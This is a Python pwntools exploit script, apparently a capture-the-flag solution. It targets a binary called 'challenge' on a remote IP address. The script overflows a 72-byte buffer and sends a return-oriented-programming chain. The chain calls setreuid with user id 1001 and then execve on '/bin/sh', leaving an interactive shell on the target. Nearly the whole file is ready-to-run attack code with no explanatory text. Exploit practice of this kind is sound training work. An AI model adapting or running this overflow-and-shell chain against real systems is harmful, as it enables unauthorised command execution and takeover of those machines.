from pwn import *
elf = ELF("./challenge")
context(os="linux", arch="amd64")
context.terminal = ["tmux", "splitw", "-h"]
# gdbscript = '''
# break *0x{elf.symbols.main:x}
# continue
# '''.format(**locals())

# p = gdb.debug([elf.path] , gdbscript=gdbscript)
# p = elf.process()
p = remote("45.76.177.238", 9334)
offset = 72
pop_rdi = p64(0x401353)
pop_rsi_r15 = p64(0x401351)
pop_rdx = p64(0x401259)
binsh = p64(0x404090)
ret = p64(0x40101a)
syscall = p64(0x40125b)
pop_rax = p64(0x40125e)
p.recvuntil(b"Programming?\n")
payload = b"A"*offset + pop_rdi + p64(1001) + pop_rsi_r15 + p64(1001) + p64(0) + pop_rdx + p64(1001) + pop_rax + p64(0x72) + syscall + pop_rdi + binsh + pop_rsi_r15 + p64(0) + p64(0) + pop_rdx + p64(0) + pop_rax + p64(0x3b) + syscall
p.sendline(payload)
p.interactive()